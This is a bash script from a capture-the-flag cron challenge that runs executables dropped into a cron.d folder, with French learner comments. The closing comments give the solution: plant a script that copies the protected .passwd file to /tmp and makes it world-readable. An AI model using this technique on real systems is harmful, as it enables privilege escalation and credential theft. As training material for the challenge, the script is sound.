#!/bin/bash

# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)

# Output of the command 'crontab -l' run as app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# You do NOT need to edit the crontab (it's chattr +i anyway)

# hiding stdout/stderr

# 2>&1 pour logger les echo et les erreurs

# A DECOMENTER
#exec 1>/dev/null 2>&1
wdir="cron.d/"

# Permet d'obtenir l'adresse du départ :
#   Le 0 indique le chemin complet d'ou est exécuté le script :
#       - ~/…/dev/RootMe/app_script/bash_cron/source.sh
# Le /* permet de remonté d'un arboressence.
challdir=${0%/*}
cd "$challdir"


# On crée le dossier si il n'existe pas
if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
    echo "le fichier a ete creer"
fi


ls -1a "${wdir}" | while read task; do
    
    echo "task : "$task
    echo $x

    # -a pour un AND
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
    	
        echo "nouveau timelimit"
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
        # -q pour pas d'ouput


    fi
    rm -f "${PWD}/${wdir}${task}"
done

# supprimer crond.d et tout sont contenu
rm -rf cron.d/*



# SOLUTION :
# echo "cat ../.passwd > /tmp/res.txt ; chmod 777 /tmp/res.txt">cron.d/test.sh 
#cat .passwd > /tmp/res.txt ; chmod 777 /tmp/res.txt


#echo "cat .passwd > /tmp/res.txt ; chmod 777 /tmp/res.txt">cron.d/test.sh ; chmod +x cron.d/test.sh
#Puis
#cat /etc/res.txt
